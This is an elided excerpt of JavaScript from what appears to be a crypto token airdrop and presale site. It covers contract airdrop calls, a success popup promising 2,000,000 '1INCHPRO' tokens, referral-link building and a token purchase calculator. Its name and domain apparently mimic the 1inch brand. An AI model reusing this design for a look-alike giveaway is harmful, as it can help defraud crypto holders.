...
const getAirdrop = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({from:addr}, (err, res) => {
   ...
   title: 'Claim Success',
   icon: 'success',
   html: '2,000,000 1INCHPRO sent to your wallet.',
...
if(!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)){
  ...
  document.getElementById('refaddress').value = 'https://1inch-pro.github.io/?ref=' + document.getElementById('refaddress').value;
}
}
}
function calculate() {
    ...
    console.log(tokens);
    document.getElementById("buyhch2input").value = tokens.toLocaleString("en-US")+' 1INCH';
